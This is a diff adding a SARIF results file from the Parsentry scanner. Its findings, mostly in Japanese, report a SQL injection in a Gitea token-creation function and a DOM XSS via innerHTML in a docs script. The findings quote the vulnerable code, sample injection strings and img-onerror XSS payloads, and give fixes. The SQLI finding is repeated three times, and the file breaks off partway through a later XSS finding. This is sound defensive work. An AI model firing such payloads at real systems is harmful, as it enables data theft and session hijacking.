@@ -1,0 +1,2307 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.14.0",
+          "information_uri": "https://github.com/HikaruEgashira/vulnhuntrs",
+          "rules": [
+            {
+              "id": "SQLI",
+              "name": "SQL Injection",
+              "short_description": {
+                "text": "Potential SQL injection vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential SQL injection vulnerability detected",
+                "markdown": "**SQL Injection**\n\nSQL injection occurs when untrusted input is passed directly to SQL queries. Use parameterized queries or prepared statements."
+              },
+              "help": {
+                "text": "SQL injection occurs when untrusted input is passed directly to SQL queries. Use parameterized queries or prepared statements.",
+                "markdown": "SQL injection occurs when untrusted input is passed directly to SQL queries. Use parameterized queries or prepared statements."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "sql"
+                ],
+                "precision": "medium",
+                "problem_severity": "8.5",
+                "security_severity": "8.5"
+              },
+              "default_configuration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "XSS",
+              "name": "Cross-Site Scripting",
+              "short_description": {
+                "text": "Potential XSS vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential XSS vulnerability detected",
+                "markdown": "**Cross-Site Scripting**\n\nCross-site scripting allows attackers to inject malicious scripts. Sanitize and validate all user input."
+              },
+              "help": {
+                "text": "Cross-site scripting allows attackers to inject malicious scripts. Sanitize and validate all user input.",
+                "markdown": "Cross-site scripting allows attackers to inject malicious scripts. Sanitize and validate all user input."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "injection",
+                  "xss"
+                ],
+                "precision": "medium",
+                "problem_severity": "7.5",
+                "security_severity": "7.5"
+              },
+              "default_configuration": {
+                "level": "warning"
+              }
+            },
+            {
+              "id": "AFO",
+              "name": "Arbitrary File Operation",
+              "short_description": {
+                "text": "Potential arbitrary file operation vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential arbitrary file operation vulnerability detected",
+                "markdown": "**Arbitrary File Operation**\n\nArbitrary file operations can lead to unauthorized file access. Validate file operations."
+              },
+              "help": {
+                "text": "Arbitrary file operations can lead to unauthorized file access. Validate file operations.",
+                "markdown": "Arbitrary file operations can lead to unauthorized file access. Validate file operations."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "file",
+                  "afo"
+                ],
+                "precision": "medium",
+                "problem_severity": "6.0",
+                "security_severity": "6.0"
+              },
+              "default_configuration": {
+                "level": "warning"
+              }
+            },
+            {
+              "id": "OVERPERM",
+              "name": "OVERPERM",
+              "short_description": {
+                "text": "Potential OVERPERM vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential OVERPERM vulnerability detected",
+                "markdown": "**OVERPERM**\n\nReview the code for potential security issues."
+              },
+              "help": {
+                "text": "Review the code for potential security issues.",
+                "markdown": "Review the code for potential security issues."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "other"
+                ],
+                "precision": "medium",
+                "problem_severity": "5.0",
+                "security_severity": "5.0"
+              },
+              "default_configuration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "AWS-S3-ENCRYPTION",
+              "name": "AWS-S3-ENCRYPTION",
+              "short_description": {
+                "text": "Potential AWS-S3-ENCRYPTION vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential AWS-S3-ENCRYPTION vulnerability detected",
+                "markdown": "**AWS-S3-ENCRYPTION**\n\nReview the code for potential security issues."
+              },
+              "help": {
+                "text": "Review the code for potential security issues.",
+                "markdown": "Review the code for potential security issues."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "other"
+                ],
+                "precision": "medium",
+                "problem_severity": "5.0",
+                "security_severity": "5.0"
+              },
+              "default_configuration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "IAM_PRIVILEGE_ESCALATION",
+              "name": "IAM_PRIVILEGE_ESCALATION",
+              "short_description": {
+                "text": "Potential IAM_PRIVILEGE_ESCALATION vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential IAM_PRIVILEGE_ESCALATION vulnerability detected",
+                "markdown": "**IAM_PRIVILEGE_ESCALATION**\n\nReview the code for potential security issues."
+              },
+              "help": {
+                "text": "Review the code for potential security issues.",
+                "markdown": "Review the code for potential security issues."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "other"
+                ],
+                "precision": "medium",
+                "problem_severity": "5.0",
+                "security_severity": "5.0"
+              },
+              "default_configuration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "RCE",
+              "name": "Remote Code Execution",
+              "short_description": {
+                "text": "Potential remote code execution vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential remote code execution vulnerability detected",
+                "markdown": "**Remote Code Execution**\n\nRemote code execution allows attackers to execute arbitrary code. Avoid executing user input as code."
+              },
+              "help": {
+                "text": "Remote code execution allows attackers to execute arbitrary code. Avoid executing user input as code.",
+                "markdown": "Remote code execution allows attackers to execute arbitrary code. Avoid executing user input as code."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "execution",
+                  "rce"
+                ],
+                "precision": "medium",
+                "problem_severity": "9.0",
+                "security_severity": "9.0"
+              },
+              "default_configuration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "PARSE_ERROR",
+              "name": "PARSE_ERROR",
+              "short_description": {
+                "text": "Potential PARSE_ERROR vulnerability detected"
+              },
+              "full_description": {
+                "text": "Potential PARSE_ERROR vulnerability detected",
+                "markdown": "**PARSE_ERROR**\n\nReview the code for potential security issues."
+              },
+              "help": {
+                "text": "Review the code for potential security issues.",
+                "markdown": "Review the code for potential security issues."
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "other"
+                ],
+                "precision": "medium",
+                "problem_severity": "5.0",
+                "security_severity": "5.0"
+              },
+              "default_configuration": {
+                "level": "note"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI: ## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```",
+            "markdown": "## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/giteacasc/gitea.py",
+                  "index": 0
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e319725dbc7fc62d"
+          },
+          "properties": {
+            "confidence": 0.95,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "user_input (token, name parameters)",
+            "action": "no_validation_no_parameterized_query",
+            "resource": "sqlite3_database_insert_operation",
+            "data_flow": "create_token(name, token) -> f-string -> con.execute(INSERT) -> access_token table"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI: ## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```",
+            "markdown": "## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/giteacasc/gitea.py",
+                  "index": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e319725dbc7fc62d"
+          },
+          "properties": {
+            "confidence": 0.95,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "user_input (token, name parameters)",
+            "action": "no_validation_no_parameterized_query",
+            "resource": "sqlite3_database_insert_operation",
+            "data_flow": "create_token(name, token) -> f-string -> con.execute(INSERT) -> access_token table"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "SQLI: ## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```",
+            "markdown": "## SQLインジェクション脆弱性\n\n### PARフレームワーク分析:\n\n**Principal（主体）**: ユーザー入力\n- `User.create_token()` メソッドの引数 `token` (ユーザー提供)\n- `name` パラメータ（デフォルト値 'token'）\n- `self.uid` (不正なアクセスの可能性がある)\n\n**Action（制御）**: セキュリティ制御がない\n- 文字列連結による直接的なSQL構築\n- パラメータ化クエリなし\n- 入力値の検証なし\n\n**Resource（対象）**: SQLデータベース\n- SQLite3 `/data/gitea/gitea.db` へのDML操作\n- `access_token` テーブルへの挿入\n\n### 脆弱性の詳細:\n\n79-80行目:\n```python\ncon.execute(f\"INSERT INTO access_token VALUES ({token_id + 1}, {self.uid}, '{name}', '{token_hash}', '{salt}', \"\n            f\"'{token_last_eight}', {now}, {now})\")\n```\n\nこのコードは以下の文字列パラメータをそのまま埋め込んでいます:\n- `{name}`: シングルクォートで囲まれているがエスケープなし\n- `{token_hash}`: シングルクォートで囲まれているがエスケープなし\n- `{salt}`: シングルクォートで囲まれているがエスケープなし\n- `{token_last_eight}`: シングルクォートで囲まれているがエスケープなし\n\n### 攻撃シナリオ:\n\n`name` パラメータに `test', (SELECT * FROM users), 'x` のような値を渡すと、以下のSQL文が生成されます:\n\n```sql\nINSERT INTO access_token VALUES (1, 100, 'test', (SELECT * FROM users), 'x', 'a1b2c3d4', 1234567890, 1234567890)\n```\n\n### 影響:\n\n- データベーススキーマの改ざん\n- 権限昇格\n- 認証バイパス\n- データ漏洩\n- T1190: Exploit Public-Facing Application\n- T1213: Data from Information Repositories\n\n### 修正方法:\n\n`execute()` の代わりに `execute()` にバインドパラメータを使用:\n```python\ncon.execute(\n    \"INSERT INTO access_token VALUES (?, ?, ?, ?, ?, ?, ?, ?)\",\n    (token_id + 1, self.uid, name, token_hash, salt, token_last_eight, now, now)\n)\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/giteacasc/gitea.py",
+                  "index": 2
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "e319725dbc7fc62d"
+          },
+          "properties": {
+            "confidence": 0.95,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "user_input (token, name parameters)",
+            "action": "no_validation_no_parameterized_query",
+            "resource": "sqlite3_database_insert_operation",
+            "data_flow": "create_token(name, token) -> f-string -> con.execute(INSERT) -> access_token table"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "XSS: ## Cross-Site Scripting (XSS) 脆弱性\n\n### 問題\nGitHub APIから取得した外部データが、入力検証やサニタイズなしに直接 DOM の `innerHTML` プロパティに挿入されています。\n\n### 脆弱性の詳細\n\n**Principal（信頼できないデータソース）:**\n- `https://api.github.com/search/repositories?q=topic:fastapi&per_page=100&page=${page}` からのレスポンス\n- 特に以下のフィールドが危険:\n  - `v.html_url`: リポジトリの URL\n  - `v.full_name`: リポジトリのフルネーム\n  - `v.owner.html_url`: オーナーの URL\n  - `v.owner.login`: オーナーのログイン名\n\n**Resource（保護されるべきリソース）:**\n- ブラウザの DOM\n- ページのスクリプト実行コンテキスト\n\n**Action（セキュリティ制御）:**\n- ✗ 入力検証なし\n- ✗ 出力エスケープなし\n- ✗ サニタイズなし\n- ✗ Content Security Policy (CSP) による保護なし\n\n### 攻撃シナリオ\n\n1. 攻撃者が GitHub でマルウェア リポジトリを作成\n2. リポジトリ名に XSS ペイロードを含める: `<img src=x onerror=\"alert('XSS')\">` または `<script>...</script>`\n3. ユーザーがこのドキュメントページを訪問\n4. `main()` 関数が GitHub API からリポジトリデータを取得\n5. リポジトリ名（XSS ペイロード）が `innerHTML` で HTML として解析・実行される\n6. ページの閲覧者のセッション、クッキー、または認証情報が窃取される\n\n### 技術的詳細\n\n**脆弱なコード (行170):**\n```javascript\nli.innerHTML = \\`<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>\\`\n```\n\n`v.full_name` が `fastapi/<img src=x onerror=\"console.log('xss')\">/repo` のような値の場合、HTML として実行されます。\n\n同様に行163も危険:\n```javascript\ndiv.innerHTML = '<ul></ul>'\n```\n\n### 攻撃可能性\n- **HTTP Request: T1190** - 外部エンティティを利用した攻撃\n- **Exploitation for Client Execution: T1203** (MITRE ATT&CK) - クライアントブラウザでの任意コード実行\n\n### 推奨される修正\n\n1. **`innerHTML` を `textContent` に変更:**\n   ```javascript\n   li.textContent = \\`...\\`  // テキストのみを設定\n   ```\n\n2. **DOM API を使用して安全に要素を構築:**\n   ```javascript\n   const a1 = document.createElement('a');\n   a1.href = v.html_url;\n   a1.target = '_blank';\n   a1.textContent = \\`★ ${v.stargazers_count} - ${v.full_name}\\`;\n   \n   const a2 = document.createElement('a');\n   a2.href = v.owner.html_url;\n   a2.target = '_blank';\n   a2.textContent = \\`@${v.owner.login}\\`;\n   \n   li.appendChild(a1);\n   li.appendChild(document.createTextNode(' by '));\n   li.appendChild(a2);\n   ```\n\n3. **DOMPurify などのライブラリを使用:**\n   ```javascript\n   li.innerHTML = DOMPurify.sanitize(htmlString);\n   ```\n\n### CVSS スコア\n- **ベクトル: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N**\n- **スコア: 8.7 (高)**\n\n### CWE\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\n### OWASP Top 10\n- **A03:2021 - Injection**\n- **A07:2021 - Cross-Site Scripting (XSS)**\n",
+            "markdown": "## Cross-Site Scripting (XSS) 脆弱性\n\n### 問題\nGitHub APIから取得した外部データが、入力検証やサニタイズなしに直接 DOM の `innerHTML` プロパティに挿入されています。\n\n### 脆弱性の詳細\n\n**Principal（信頼できないデータソース）:**\n- `https://api.github.com/search/repositories?q=topic:fastapi&per_page=100&page=${page}` からのレスポンス\n- 特に以下のフィールドが危険:\n  - `v.html_url`: リポジトリの URL\n  - `v.full_name`: リポジトリのフルネーム\n  - `v.owner.html_url`: オーナーの URL\n  - `v.owner.login`: オーナーのログイン名\n\n**Resource（保護されるべきリソース）:**\n- ブラウザの DOM\n- ページのスクリプト実行コンテキスト\n\n**Action（セキュリティ制御）:**\n- ✗ 入力検証なし\n- ✗ 出力エスケープなし\n- ✗ サニタイズなし\n- ✗ Content Security Policy (CSP) による保護なし\n\n### 攻撃シナリオ\n\n1. 攻撃者が GitHub でマルウェア リポジトリを作成\n2. リポジトリ名に XSS ペイロードを含める: `<img src=x onerror=\"alert('XSS')\">` または `<script>...</script>`\n3. ユーザーがこのドキュメントページを訪問\n4. `main()` 関数が GitHub API からリポジトリデータを取得\n5. リポジトリ名（XSS ペイロード）が `innerHTML` で HTML として解析・実行される\n6. ページの閲覧者のセッション、クッキー、または認証情報が窃取される\n\n### 技術的詳細\n\n**脆弱なコード (行170):**\n```javascript\nli.innerHTML = \\`<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>\\`\n```\n\n`v.full_name` が `fastapi/<img src=x onerror=\"console.log('xss')\">/repo` のような値の場合、HTML として実行されます。\n\n同様に行163も危険:\n```javascript\ndiv.innerHTML = '<ul></ul>'\n```\n\n### 攻撃可能性\n- **HTTP Request: T1190** - 外部エンティティを利用した攻撃\n- **Exploitation for Client Execution: T1203** (MITRE ATT&CK) - クライアントブラウザでの任意コード実行\n\n### 推奨される修正\n\n1. **`innerHTML` を `textContent` に変更:**\n   ```javascript\n   li.textContent = \\`...\\`  // テキストのみを設定\n   ```\n\n2. **DOM API を使用して安全に要素を構築:**\n   ```javascript\n   const a1 = document.createElement('a');\n   a1.href = v.html_url;\n   a1.target = '_blank';\n   a1.textContent = \\`★ ${v.stargazers_count} - ${v.full_name}\\`;\n   \n   const a2 = document.createElement('a');\n   a2.href = v.owner.html_url;\n   a2.target = '_blank';\n   a2.textContent = \\`@${v.owner.login}\\`;\n   \n   li.appendChild(a1);\n   li.appendChild(document.createTextNode(' by '));\n   li.appendChild(a2);\n   ```\n\n3. **DOMPurify などのライブラリを使用:**\n   ```javascript\n   li.innerHTML = DOMPurify.sanitize(htmlString);\n   ```\n\n### CVSS スコア\n- **ベクトル: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N**\n- **スコア: 8.7 (高)**\n\n### CWE\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\n### OWASP Top 10\n- **A03:2021 - Injection**\n- **A07:2021 - Cross-Site Scripting (XSS)**\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 3
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "5e951570e79c6518"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "External GitHub API response (v.html_url, v.full_name, v.owner.html_url, v.owner.login)",
+            "action": "No input validation, sanitization, or output escaping applied",
+            "resource": "Browser DOM via innerHTML assignment (line 170)",
+            "data_flow": "GitHub API → getDataBatch() → getData() → main() → data.forEach() → li.innerHTML with unsanitized external data"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "XSS: ### XSS脆弱性: DOM操作への信頼できないデータの挿入\n\n**問題**: GitHub APIから取得した外部データが直接HTMLコンテンツとしてDOMに挿入されています。\n\n**詳細**:\n- **Principal**: GitHub API v3 REST API（信頼できない外部ソース）\n  - `v.html_url`: リポジトリのURL\n  - `v.full_name`: リポジトリの完全名\n  - `v.owner.html_url`: オーナーのプロフィールURL\n  - `v.owner.login`: オーナーのログイン名\n\n- **Action**: セキュリティ制御が欠如\n  - HTMLエスケープ処理なし\n  - バリデーション処理なし\n  - サニタイズ処理なし\n\n- **Resource**: DOM操作\n  - 170行目: `li.innerHTML` により、信頼できないデータが直接HTMLとして解釈されます\n\n**攻撃シナリオ**:\n1. GitHub APIが中間者攻撃(MITM)により改ざんされた場合\n2. APIレスポンスに悪質なJavaScriptを含めることで、ページ訪問者の環境で実行される\n3. 例: `v.html_url = 'javascript:alert(1)'` または `v.full_name = '<img src=x onerror=alert(1)>'`\n\n**推奨される修正**:\n- `innerHTML` の代わりに `textContent` を使用するか、`innerText` を使用\n- または、`createElement` と `setAttribute` で安全にDOM要素を構築\n- API応答の入力バリデーション実装",
+            "markdown": "### XSS脆弱性: DOM操作への信頼できないデータの挿入\n\n**問題**: GitHub APIから取得した外部データが直接HTMLコンテンツとしてDOMに挿入されています。\n\n**詳細**:\n- **Principal**: GitHub API v3 REST API（信頼できない外部ソース）\n  - `v.html_url`: リポジトリのURL\n  - `v.full_name`: リポジトリの完全名\n  - `v.owner.html_url`: オーナーのプロフィールURL\n  - `v.owner.login`: オーナーのログイン名\n\n- **Action**: セキュリティ制御が欠如\n  - HTMLエスケープ処理なし\n  - バリデーション処理なし\n  - サニタイズ処理なし\n\n- **Resource**: DOM操作\n  - 170行目: `li.innerHTML` により、信頼できないデータが直接HTMLとして解釈されます\n\n**攻撃シナリオ**:\n1. GitHub APIが中間者攻撃(MITM)により改ざんされた場合\n2. APIレスポンスに悪質なJavaScriptを含めることで、ページ訪問者の環境で実行される\n3. 例: `v.html_url = 'javascript:alert(1)'` または `v.full_name = '<img src=x onerror=alert(1)>'`\n\n**推奨される修正**:\n- `innerHTML` の代わりに `textContent` を使用するか、`innerText` を使用\n- または、`createElement` と `setAttribute` で安全にDOM要素を構築\n- API応答の入力バリデーション実装"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js",
+                  "index": 4
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "ad99746483a892a2"
+          },
+          "properties": {
+            "confidence": 0.9,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "GitHub API v3 REST API (external untrusted source)",
+            "action": "No validation, sanitization, or encoding applied",
+            "resource": "DOM innerHTML property at line 170",
+            "data_flow": "GitHub API response → v object properties → template literal → innerHTML"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
